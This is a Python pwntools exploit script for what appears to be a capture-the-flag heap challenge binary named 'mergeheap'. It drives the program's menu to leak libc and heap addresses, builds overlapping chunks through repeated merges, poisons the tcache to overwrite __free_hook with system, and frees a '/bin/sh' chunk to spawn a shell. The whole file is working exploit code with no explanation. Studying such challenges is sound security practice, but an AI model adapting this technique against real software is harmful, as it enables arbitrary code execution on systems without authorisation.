from pwn import *

p = process("./mergeheap")
# context.log_level = 'debug'
libc = ELF("/libc64.so")


def add(len, cont):
    p.recvuntil(">>")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(len))
    p.recvuntil(":")
    p.send(cont)


def dele(idx):
    p.recvuntil(">>")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))


def show(idx):
    p.recvuntil(">>")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))


def merge(idx1, idx2):
    p.recvuntil(">>")
    p.sendline("4")
    p.recvuntil(":")
    p.sendline(str(idx1))
    p.recvuntil(":")
    p.sendline(str(idx2))


for i in range(12):
    add(0xf8, "1" * 0xf8)
for i in range(8):
    dele(i)
add(8, "a" * 8)  # 0
add(8, 'a' * 8)  # 1
show(0)
p.recvuntil('a' * 8)
libc.address = u64(p.recv(6) + "\x00\x00") - 0x3ebcc0 - 0xd0
success(hex(libc.address))
# print hexdump(p.recv())
dele(0)
dele(1)
add(1, '1')
show(0)
heap = u64(p.recv(6) + "\x00\x00") - 0x931
success(hex(heap))
add(0x88, 'a' * 0x88)  # 1
add(0x88, 'a' * 8 + p64(0xf1) + '\n')  # 2
# context.log_level = 'debug'
add(0x88, '1' * 0x18 + p64(heap + 0xa60) + "\n")  # 3

add(0x88, '1' * 0x10 + p64(heap + 0xa60) + '\n')  # 4
add(0x70, 'a' * 0x6f + '\n')  # 5
add(0xf8, 'nihao\n')  # 6

dele(8)
merge(1, 5)  # 7
for i in range(8):
    dele(7)
    dele(5)
    add(0x70, 'a' * (0x6e - i) + '\n')
    merge(1, 5)  # 7

dele(7)
dele(5)
add(0x70, 'a' * 0x67 + '\xf0\n')
merge(1, 5)  # 7

dele(5)
add(0x70, '\n')

for i in range(8):
    dele(1)
    dele(7)
    add(0x88, 'a' * (0x1f - i) + '\n')
    merge(1, 5)

dele(7)
merge(3, 5)

for i in range(8):
    dele(1)
    dele(7)
    add(0x88, 'a' * (0x17 - i) + '\n')
    merge(1, 5)

dele(7)
merge(4, 5)

for i in range(8):
    dele(1)
    dele(7)
    add(0x88, 'a' * (0xf - i) + '\n')
    merge(1, 5)

dele(7)
merge(2, 5)
dele(7)
dele(9)
add(0x30, '1\n')  # 7
add(0x30, '1\n')  # 8
add(0x30, "/bin/sh\n")  # 9
dele(8)
dele(7)
add(0xf8, p64(0) + p64(0x41) + p64(libc.symbols['__free_hook']) + '\n')
add(0x30, '1\n')
add(0x30, p64(libc.symbols['system']) + '\n')
dele(9)
p.interactive()
# pause()
